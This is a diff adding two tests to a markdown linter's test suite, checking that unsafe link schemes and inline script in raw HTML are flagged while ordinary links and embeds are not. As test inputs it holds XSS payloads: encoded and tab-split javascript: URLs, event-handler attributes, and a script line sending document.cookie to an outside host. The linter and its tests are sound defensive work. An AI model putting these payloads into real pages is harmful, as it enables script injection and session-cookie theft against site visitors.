@@ -178,6 +178,52 @@ describe("lint rules", () => {
     expect(rules(`${FM}${c.repeat(3)}`)).toEqual([]);
     expect(rules(`${FM}${c.repeat(4)}`, { maxCalloutsPer1000: 4 })).toEqual([]);
   });
+  // ── H0 / docs/11 finding 10 ───────────────────────────────────────────────────────────────────
+  test("12 unsafe-url: a scheme that executes is refused; the web that does not is left alone", () => {
+    const d = find(`${FM}[click](javascript:fetch('/x'))\n`, "unsafe-url")!;
+    expect(d.severity).toBe("error");
+    expect(d.message).toContain("`javascript:`");
+    expect(d.line).toBe(7);
+    // The two shapes a naive `startsWith` misses, both of which reach the renderer as `javascript:`:
+    // a pointed destination may hold a tab, which browsers ignore inside a scheme, and micromark
+    // decodes character references before anything downstream sees the url.
+    expect(find(`${FM}[a](<java\tscript:alert(1)>)\n`, "unsafe-url")).toBeDefined();
+    expect(find(`${FM}[a](&#106;avascript:alert&#40;1&#41;)\n`, "unsafe-url")).toBeDefined();
+    expect(find(`${FM}[a](JAVASCRIPT:x)\n`, "unsafe-url")).toBeDefined();
+    expect(find(`${FM}[a](VBScript:x)\n`, "unsafe-url")).toBeDefined();
+    expect(find(`${FM}![shot](data:text/html;base64,PHNjcmlwdD4=)\n`, "unsafe-url")!.message).toContain("loads");
+    // …and everything a post actually contains stays a link.
+    for (const md of ["[a](/posts/a)", "[a](../about)", "[a](#top)", "[a](https://x.example)", "[a](mailto:a@b.example)", "[a](tel:+15551234)"])
+      expect(find(`${FM}${md}\n`, "unsafe-url")).toBeUndefined();
+    expect(find(`${FM}![p](data:image/png;base64,iVBORw0KGgo=)\n`, "unsafe-url")).toBeUndefined();
+  });
+  // ── H2 / docs/11 finding 1 ────────────────────────────────────────────────────────────────────
+  test("13 inline-script: raw HTML that adds script is an error on the line it is on; raw HTML that does not is left alone", () => {
+    const d = find(`${FM}Intro.\n\n<div>\n<script>fetch('https://x.example/'+document.cookie)</script>\n</div>\n`, "inline-script")!;
+    expect(d.severity).toBe("error");
+    expect(d.message).toContain("<script>fetch(");
+    expect(d.message).toMatch(/\(\d+ B\)/);
+    expect(d.line).toBe(10);   // the script's own line inside the html block, not the block's first line
+    expect(d.hint).toContain("bench.budgets.jsKb");
+    // every shape the build weighs, each named
+    expect(find(`${FM}<img src="x.png" alt="x" onerror="alert(1)">\n`, "inline-script")!.message).toContain('onerror="alert(1)"');
+    expect(find(`${FM}<a href="javascript:alert(1)">x</a>\n`, "inline-script")!.message).toContain("href=");
+    expect(find(`${FM}<script src="https://evil.example/x.js"></script>\n`, "inline-script")!.message).toContain("another origin");
+    expect(find(`${FM}Inline <span onclick="go()">html</span> in prose.\n`, "inline-script")).toBeDefined();
+    expect(lintMarkdown(`${FM}<p onclick="a()" onmouseover="b()">x</p>\n`, LINT_CTX).diagnostics.filter((x) => x.rule === "inline-script")).toHaveLength(2);
+    // …and the embeds raw HTML exists for are not script. A data block is not script either: the browser's own `type` test.
+    for (const md of [
+      `<iframe src="https://www.youtube-nocookie.com/embed/x" title="v"></iframe>`,
+      `<details><summary>More</summary>Body</details>`,
+      `<video src="/media/a.mp4" poster="/media/a.jpg" controls></video>`,
+      `<script type="application/ld+json">{"@type":"Thing"}</script>`,
+      `<script type="text/plain">not run</script>`,
+      `<p data-once="x" on="y">attributes that merely start with "on"</p>`,
+    ]) expect(find(`${FM}${md}\n`, "inline-script")).toBeUndefined();
+    // code is not raw HTML: a post *about* script must be writable
+    expect(find(`${FM}\`\`\`html\n<script>alert(1)</script>\n\`\`\`\n\nUse \`<button onclick="x()">\` sparingly.\n`, "inline-script")).toBeUndefined();
+  });
+
   test("diagnostics are sorted by line, carry file and fix hints", () => {
     const r = lintMarkdown(`${FM}::hero\n\n::stat{value="1" label="l"}\n`, { file: "p.md", type: POST_TYPE as never, routes: new Set() });
     expect(r.diagnostics.map((d) => [d.file, d.line, d.n])).toEqual([["p.md", 7, 1], ["p.md", 9, 3]]);
